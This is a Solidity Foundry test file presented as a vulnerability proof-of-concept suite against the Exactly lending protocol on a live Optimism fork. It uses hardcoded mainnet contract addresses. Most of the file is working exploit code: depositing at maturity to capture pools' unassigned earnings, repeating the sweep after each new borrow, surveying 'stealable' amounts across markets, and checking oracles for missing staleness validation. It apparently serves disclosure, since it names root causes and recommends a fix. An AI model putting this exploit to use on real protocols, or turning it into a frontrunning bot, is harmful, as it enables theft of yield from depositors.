// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.17; // solhint-disable-line one-contract-per-file

import { Test } from "forge-std/Test.sol";
import { FixedPointMathLib } from "solmate/src/utils/FixedPointMathLib.sol";
import { ERC20, Market, FixedLib } from "../contracts/Market.sol";
import { Auditor, IPriceFeed } from "../contracts/Auditor.sol";

/// @notice Aave V3 Pool interface for flash loans
interface IAavePool {
  function flashLoanSimple(
    address receiverAddress,
    address asset,
    uint256 amount,
    bytes calldata params,
    uint16 referralCode
  ) external;
  function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint128);
}

/// @title Exactly Protocol - Vulnerability PoC Suite (Live Optimism Fork)
/// @dev Run: forge test --match-contract ZeroCapitalAttack -vvv --fork-url https://optimism-rpc.publicnode.com
contract ZeroCapitalAttack is Test {
  using FixedPointMathLib for uint256;

  Auditor constant auditor = Auditor(0xaEb62e6F27BC103702E7BC879AE98bceA56f027E);
  Market constant marketUSDC = Market(0x6926B434CCe9b5b7966aE1BfEef6D0A7DCF3A8bb);
  Market constant marketWETH = Market(0xc4d4500326981eacD020e20A81b1c479c161c7EF);
  Market constant marketOP = Market(0xa430A427bd00210506589906a71B54d6C256CEdb);

  ERC20 constant USDC = ERC20(0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85);
  ERC20 constant WETH = ERC20(0x4200000000000000000000000000000000000006);
  ERC20 constant OP = ERC20(0x4200000000000000000000000000000000000042);

  IAavePool constant AAVE_POOL = IAavePool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
  address constant AAVE_AUSDC = 0x38d693cE1dF5AaDF7bC62595A37D667aD57922e5;

  uint256 constant INTERVAL = 4 weeks;
  address attacker;

  function setUp() public {
    attacker = makeAddr("attacker");
    vm.label(address(marketUSDC), "MarketUSDC");
    vm.label(address(USDC), "USDC");
    vm.label(address(AAVE_POOL), "AaveV3Pool");
  }

  // =========================================================================
  // ATTACK 5: Unassigned Earnings Theft via Deposit-at-Maturity
  // =========================================================================
  /// @notice Core vulnerability: depositAtMaturity instantly grants 90% of pool's
  ///   unassigned earnings to ANY depositor, regardless of when they deposit.
  ///   This allows an attacker to frontrun borrows or simply deposit into any pool
  ///   with accumulated unassigned earnings to steal them.
  ///
  /// Root cause: calculateDeposit awards earnings proportional to amount, not time held.
  /// The 10% backup fee is insufficient to prevent extraction since the attacker
  /// captures 90% of earnings that were meant to accrue to the floating pool over time.
  function testAttack5_EarningsTheftViaDeposit() external {
    emit log_string("=== ATTACK 5: Unassigned Earnings Theft ===");

    // --- Phase 1: Find a valid future maturity ---
    uint256 mat = _findFirstValidMaturity();
    require(mat > 0, "No valid maturity found");
    emit log_named_uint("Target maturity", mat);
    emit log_named_uint("Time to maturity (seconds)", mat - block.timestamp);

    // --- Phase 2: Generate unassigned earnings via borrows ---
    _simulateBorrow(mat, 200_000e6, "whale1");
    _simulateBorrow(mat, 200_000e6, "whale2");
    _simulateBorrow(mat, 100_000e6, "whale3");

    // Record pool state after borrows
    (uint256 borrowed, uint256 supplied, uint256 unassigned, ) = marketUSDC.fixedPools(mat);
    uint256 backupSupplied = borrowed > supplied ? borrowed - supplied : 0;
    emit log_string("--- Pool state after borrows ---");
    emit log_named_uint("  Borrowed", borrowed);
    emit log_named_uint("  Supplied", supplied);
    emit log_named_uint("  Unassigned earnings", unassigned);
    emit log_named_uint("  Backup supplied", backupSupplied);
    require(unassigned > 0 && backupSupplied > 0, "No earnings to capture");

    // --- Phase 3: Attacker deposits to capture earnings ---
    uint256 depositAmt = backupSupplied; // deposit exactly the backup amount
    deal(address(USDC), attacker, depositAmt);
    uint256 attackerBalBefore = USDC.balanceOf(attacker);

    vm.startPrank(attacker);
    USDC.approve(address(marketUSDC), type(uint256).max);
    uint256 positionAssets = marketUSDC.depositAtMaturity(mat, depositAmt, 0, attacker);
    vm.stopPrank();

    uint256 capturedEarnings = positionAssets - depositAmt;
    emit log_string("--- Attacker deposit result ---");
    emit log_named_uint("  Deposited", depositAmt);
    emit log_named_uint("  Position at maturity", positionAssets);
    emit log_named_uint("  CAPTURED EARNINGS", capturedEarnings);

    // Verify pool was drained
    (, , uint256 unassignedAfter, ) = marketUSDC.fixedPools(mat);
    emit log_named_uint("  Pool unassigned BEFORE", unassigned);
    emit log_named_uint("  Pool unassigned AFTER", unassignedAfter);
    emit log_named_uint("  Earnings STOLEN from pool", unassigned - unassignedAfter);

    // --- Phase 4: Warp to maturity and withdraw with NO discount ---
    vm.warp(mat);
    vm.startPrank(attacker);
    uint256 withdrawn = marketUSDC.withdrawAtMaturity(mat, positionAssets, 0, attacker, attacker);
    vm.stopPrank();

    uint256 attackerBalAfter = USDC.balanceOf(attacker);
    uint256 netProfit = attackerBalAfter > attackerBalBefore ? attackerBalAfter - attackerBalBefore : 0;

    emit log_string("=== RESULTS ===");
    emit log_named_uint("Withdrawn at maturity", withdrawn);
    emit log_named_uint("Attacker started with", attackerBalBefore);
    emit log_named_uint("Attacker ended with", attackerBalAfter);
    emit log_named_uint("NET PROFIT", netProfit);

    // Assertions
    assertGt(capturedEarnings, 0, "Must capture earnings");
    assertGt(netProfit, 0, "Must be profitable");
    assertEq(withdrawn, positionAssets, "Full position returned at maturity");
    emit log_string("[CONFIRMED] Attacker stole unassigned earnings. Deposit-and-hold to maturity.");
    emit log_string("[CONFIRMED] No lockup required - earnings granted instantly on deposit.");
    emit log_string("[CONFIRMED] 90% of pool earnings captured by attacker, 10% to accumulator.");
  }

  // =========================================================================
  // ATTACK 6: Repeated MEV Extraction After Each Borrow
  // =========================================================================
  /// @notice Shows the attack is repeatable: every new fixed-rate borrow creates
  ///   new unassigned earnings that can be immediately sniped.
  function testAttack6_RepeatedSweepDemonstration() external {
    emit log_string("=== ATTACK 6: Repeated MEV Extraction ===");

    uint256 mat = _findFirstValidMaturity();
    require(mat > 0, "No valid maturity");

    // Sweep 1: First borrow generates earnings, attacker captures
    _simulateBorrow(mat, 200_000e6, "normalUser1");
    uint256 profit1 = _depositSweep(mat, "sweep1");

    // Sweep 2: Another borrow, attacker captures again
    vm.warp(block.timestamp + 3 days);
    _simulateBorrow(mat, 150_000e6, "normalUser2");
    uint256 profit2 = _depositSweep(mat, "sweep2");

    // Sweep 3: One more
    vm.warp(block.timestamp + 2 days);
    _simulateBorrow(mat, 100_000e6, "normalUser3");
    uint256 profit3 = _depositSweep(mat, "sweep3");

    // Warp to maturity and withdraw all positions
    vm.warp(mat);
    vm.startPrank(attacker);
    // attacker may have multiple positions from the sweeps - withdraw the full consolidated
    // position
    FixedLib.Position memory pos = _getPosition(mat, attacker);
    if (pos.principal + pos.fee > 0) {
      marketUSDC.withdrawAtMaturity(mat, pos.principal + pos.fee, 0, attacker, attacker);
    }
    vm.stopPrank();

    emit log_string("=== REPEATED EXTRACTION RESULTS ===");
    emit log_named_uint("Sweep 1 captured", profit1);
    emit log_named_uint("Sweep 2 captured", profit2);
    emit log_named_uint("Sweep 3 captured", profit3);
    emit log_named_uint("Total captured across sweeps", profit1 + profit2 + profit3);
    emit log_named_uint("Attacker final USDC balance", USDC.balanceOf(attacker));
    emit log_string("[CONFIRMED] Every new borrow creates new stealable earnings");
  }

  // =========================================================================
  // ATTACK 7: Multi-Market Cross-Pool Sweep
  // =========================================================================
  /// @notice Demonstrates earnings theft across all live markets simultaneously
  function testAttack7_FullProtocolSurvey() external {
    emit log_string("=== ATTACK 7: FULL PROTOCOL VULNERABILITY SURVEY ===");

    uint256 totalExposure;

    totalExposure += _surveyMarket(marketUSDC, "USDC");
    totalExposure += _surveyMarket(marketWETH, "WETH");
    totalExposure += _surveyMarket(marketOP, "OP");
    totalExposure += _surveyMarket(Market(0x22ab31Cd55130435b5efBf9224b6a9d5EC36533F), "wstETH");

    emit log_string("");
    emit log_named_uint("TOTAL EXTRACTABLE UNASSIGNED (all markets, raw)", totalExposure);
    emit log_string("Attacker captures 90% of above on deposit (10% backup fee)");
    emit log_string("");
    emit log_string("=== ROOT CAUSE ===");
    emit log_string("FixedLib.calculateDeposit grants unassigned earnings proportional to deposit");
    emit log_string("amount, with NO consideration of time held. A just-in-time deposit captures");
    emit log_string("earnings that were accruing linearly to the floating pool over weeks/months.");
    emit log_string("");
    emit log_string("=== IMPACT ===");
    emit log_string("1. Every fixed-rate borrow fee can be sniped by a monitoring bot");
    emit log_string("2. Floating pool depositors lose yield they should have received");
    emit log_string("3. Attack is permissionless, repeatable, and costs only gas + capital lockup");
    emit log_string("4. MEV bots can frontrun borrowAtMaturity txs to capture generated fees");
    emit log_string("");
    emit log_string("=== RECOMMENDED FIX ===");
    emit log_string("Time-weight the earnings distribution in calculateDeposit so that");
    emit log_string("a depositor must hold their position for a meaningful period to earn yield.");
  }

  // =========================================================================
  // ATTACK 8: Oracle Configuration Audit + Staleness Check
  // =========================================================================
  /// @notice Checks if any live market uses a manipulable PriceFeedPool oracle
  ///   or if the Auditor lacks staleness validation (it does - no updatedAt check).
  function testAttack8_OracleConfigAudit() external {
    emit log_string("=== ATTACK 8: Oracle Configuration & Staleness Audit ===");

    Market[] memory mkts = new Market[](4);
    mkts[0] = marketUSDC;
    mkts[1] = marketWETH;
    mkts[2] = marketOP;
    mkts[3] = Market(0x22ab31Cd55130435b5efBf9224b6a9d5EC36533F);
    string[4] memory names = ["USDC", "WETH", "OP", "wstETH"];

    for (uint256 i = 0; i < mkts.length; ++i) {
      (uint128 adjustFactor, , , bool isListed, IPriceFeed priceFeed) = auditor.markets(mkts[i]);
      if (!isListed) continue;

      emit log_string(string.concat("--- ", names[i], " ---"));
      emit log_named_address("  Price feed", address(priceFeed));
      emit log_named_uint("  Adjust factor", adjustFactor);

      int256 price = priceFeed.latestAnswer();
      emit log_named_int("  Current price", price);

      // Check if this is a PriceFeedPool (has pool() function)
      (bool ok, bytes memory data) = address(priceFeed).staticcall(abi.encodeWithSignature("pool()"));
      if (ok && data.length >= 32) {
        address poolAddr = abi.decode(data, (address));
        emit log_named_address("  [CRITICAL] PriceFeedPool detected! Pool", poolAddr);
        emit log_string("  [CRITICAL] This oracle uses AMM spot reserves - FLASH LOAN MANIPULABLE");
      }

      // Check if this is a PriceFeedWrapper (has wrapper() function)
      (ok, data) = address(priceFeed).staticcall(abi.encodeWithSignature("wrapper()"));
      if (ok && data.length >= 32) {
        address wrapper = abi.decode(data, (address));
        emit log_named_address("  PriceFeedWrapper detected. Wrapper", wrapper);
      }

      // Check if this is a PriceFeedDouble (has priceFeedTwo() function)
      (ok, data) = address(priceFeed).staticcall(abi.encodeWithSignature("priceFeedTwo()"));
      if (ok && data.length >= 32) {
        address feed2 = abi.decode(data, (address));
        emit log_named_address("  PriceFeedDouble detected. Feed2", feed2);
      }
    }

    emit log_string("");
    emit log_string("=== ORACLE STALENESS VULNERABILITY ===");
    emit log_string("Auditor.assetPrice() calls priceFeed.latestAnswer() with ZERO validation:");
    emit log_string("  - No updatedAt timestamp check");
    emit log_string("  - No answeredInRound check");
    emit log_string("  - No heartbeat/staleness threshold");
    emit log_string("  - Only checks price > 0");
    emit log_string("");
    emit log_string("IMPACT: During Chainlink outages or congestion, stale prices enable:");
    emit log_string("  1. Borrowing against inflated collateral (stale high price)");
    emit log_string("  2. Avoiding liquidation (stale price hides underwater position)");
    emit log_string("  3. Under-collateralized positions that become bad debt");
    emit log_string("  4. If PriceFeedDouble is used, stale feed A * fresh feed B = wrong price");
  }

  // ==================== INTERNAL HELPERS ====================

  function _findFirstValidMaturity() internal view returns (uint256 mat) {
    uint256 base = block.timestamp - (block.timestamp % INTERVAL);
    uint8 maxPools = marketUSDC.maxFuturePools();
    for (uint256 i = 1; i <= maxPools; ++i) {
      uint256 m = base + (i * INTERVAL);
      if (m > block.timestamp) return m;
    }
  }

  function _simulateBorrow(uint256 maturity, uint256 amount, string memory name) internal {
    address user = makeAddr(name);
    deal(address(WETH), user, 500 ether);
    vm.startPrank(user);
    WETH.approve(address(marketWETH), type(uint256).max);
    marketWETH.deposit(500 ether, user);
    auditor.enterMarket(marketWETH);
    auditor.enterMarket(marketUSDC);
    uint256 owed = marketUSDC.borrowAtMaturity(maturity, amount, type(uint256).max, user, user);
    vm.stopPrank();
    emit log_named_uint("  Borrowed", amount);
    emit log_named_uint("  Fee generated", owed - amount);
  }

  function _depositSweep(uint256 maturity, string memory label) internal returns (uint256 captured) {
    (uint256 b, uint256 s, uint256 u, ) = marketUSDC.fixedPools(maturity);
    if (u == 0 || b <= s) return 0;

    uint256 backupSupplied = b - s;
    deal(address(USDC), attacker, USDC.balanceOf(attacker) + backupSupplied);
    vm.startPrank(attacker);
    USDC.approve(address(marketUSDC), type(uint256).max);
    uint256 positionAssets = marketUSDC.depositAtMaturity(maturity, backupSupplied, 0, attacker);
    vm.stopPrank();

    captured = positionAssets - backupSupplied;
    emit log_named_string("  Sweep", label);
    emit log_named_uint("    Deposited", backupSupplied);
    emit log_named_uint("    Position value", positionAssets);
    emit log_named_uint("    Captured earnings", captured);
  }

  function _getPosition(uint256 maturity, address account) internal view returns (FixedLib.Position memory) {
    (uint256 principal, uint256 fee) = marketUSDC.fixedDepositPositions(maturity, account);
    return FixedLib.Position(principal, fee);
  }

  function _surveyMarket(Market mkt, string memory name) internal returns (uint256 totalUnassigned) {
    emit log_string(string.concat("--- Market: ", name, " ---"));

    uint256 ta = mkt.totalAssets();
    uint256 ea = mkt.earningsAccumulator();
    emit log_named_uint("  Total Assets", ta);
    emit log_named_uint("  Earnings Accumulator", ea);

    uint256 base = block.timestamp - (block.timestamp % INTERVAL);
    for (uint256 i = 1; i <= 12; ++i) {
      uint256 mat = base + (i * INTERVAL);
      (uint256 b, uint256 s, uint256 u, ) = mkt.fixedPools(mat);
      if (u > 0 && b > s) {
        emit log_named_uint("  Maturity", mat);
        emit log_named_uint("    Unassigned (stealable)", u);
        emit log_named_uint("    Backup supplied (capital needed)", b - s);
        totalUnassigned += u;
      }
    }
    if (totalUnassigned > 0) {
      emit log_named_uint("  TOTAL STEALABLE in this market", totalUnassigned);
    }
  }
}
